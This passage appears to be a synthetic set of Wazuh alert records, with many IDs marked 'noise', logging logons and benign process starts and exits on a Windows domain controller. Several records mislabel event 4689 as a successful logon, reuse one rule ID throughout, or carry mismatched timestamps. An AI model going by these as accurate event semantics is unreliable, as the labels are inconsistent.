        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T18:40:33Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xae3c2"
          }
        }
      },
      "timestamp": "2025-10-08T18:40:33Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0025-1771",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T18:43:11Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xdd713"
          }
        }
      },
      "timestamp": "2025-10-08T18:43:11Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0003-9279",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T17:31:45Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x9b1de"
          }
        }
      },
      "timestamp": "2025-10-08T17:31:45Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0012-1750",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process has exited.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T17:09:29Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xaa488"
          }
        }
      },
      "timestamp": "2025-10-08T17:09:29Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0050-2612",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process has exited.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T18:29:13Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x10844"
          }
        }
      },
      "timestamp": "2025-10-08T18:29:13Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0029-5371",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process has exited.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T18:13:18Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xc5c2e"
          }
        }
      },
      "timestamp": "2025-10-08T18:13:18Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0008-6881",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process was created.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T17:13:12Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xd9f56"
          }
        }
      },
      "timestamp": "2025-10-08T17:13:12Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0023-8019",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process has exited.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T18:19:48Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\mspaint.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xe6d7b"
          }
        }
      },
      "timestamp": "2025-10-08T18:19:48Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "0e71683d-a123-4c95-b366-7dc9e99c6b04",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process was created.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T18:07:31.023336Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x37cfd"
          }
        }
      },
      "timestamp": "2025-10-08T17:47:47.023357Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "86cd7c31-a22f-4318-a904-70a38c66bd46",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T18:12:05.023480Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xaf1f3"
          }
        }
      },
      "timestamp": "2025-10-08T17:51:33.023485Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0032-5889",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process has exited.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T17:14:31Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xd877a"
          }
        }
      },
      "timestamp": "2025-10-08T17:14:31Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "8d7d67e4-40a8-44b0-b39d-2c5544b4d741",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T17:53:48.024550Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x6aad4"
          }
        }
      },
      "timestamp": "2025-10-08T17:44:28.024555Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "45494650-c409-40e0-abc0-b4d29669943d",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T18:20:11.024247Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xd096b"
          }
        }
      },
      "timestamp": "2025-10-08T17:59:23.024255Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0010-7201",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process has exited.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T17:17:02Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x152c3"
          }
        }
      },
      "timestamp": "2025-10-08T17:17:02Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0024-3266",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process was created.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T17:29:56Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\taskmgr.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x83705"
          }
        }
      },
      "timestamp": "2025-10-08T17:29:56Z",
      "location": "EventChannel"
    }
  },
